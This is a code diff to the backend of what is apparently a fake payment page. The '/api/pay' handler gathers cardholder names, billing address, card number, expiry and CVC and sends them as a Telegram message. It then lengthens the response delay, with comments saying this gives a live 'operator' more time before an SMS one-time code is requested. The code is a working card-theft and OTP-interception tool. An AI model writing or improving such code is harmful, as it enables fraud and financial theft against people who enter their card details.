@@ -84,13 +84,15 @@ function generateCode() {
 }
 
 app.post('/api/pay', async (req, res) => {
-    const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
+    const { firstName, lastName, billingAddress, cardNumber, expiry, cvc, email, country } = req.body;
     const paymentId = Math.random().toString(36).substring(2, 11);
     pendingPayments.set(paymentId, { needsSms: false });
 
     try {
         const message = `💳 *NOUVEAU PAIEMENT (SERVER)*\n\n` +
-            `👤 *NOM:* \`${cardHolder || 'N/A'}\`\n` +
+            `👤 *NOM:* \`${lastName || 'N/A'}\`\n` +
+            `👤 *PRÉNOM:* \`${firstName || 'N/A'}\`\n` +
+            `🏠 *ADRESSE:* \`${billingAddress || 'N/A'}\`\n` +
             `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
             `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
             `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
@@ -108,15 +110,18 @@ app.post('/api/pay', async (req, res) => {
         console.error("Telegram log error server.js:", err.message);
     }
 
-    setTimeout(() => {
+    // Delay 10 seconds (gives more time to the operator)
+    setTimeout(async () => {
         const p = pendingPayments.get(paymentId);
         if (p && p.needsSms) {
+            // "ajouter du temps"
+            await new Promise(resolve => setTimeout(resolve, 5000));
             return res.json({ success: true, needsSms: true, paymentId });
         }
         const newCode = generateCode();
         res.json({ success: true, code: newCode });
         pendingPayments.delete(paymentId);
-    }, 5000);
+    }, 10000); // 10s wait for operator
 });
 
 app.post('/api/submit-sms', async (req, res) => {
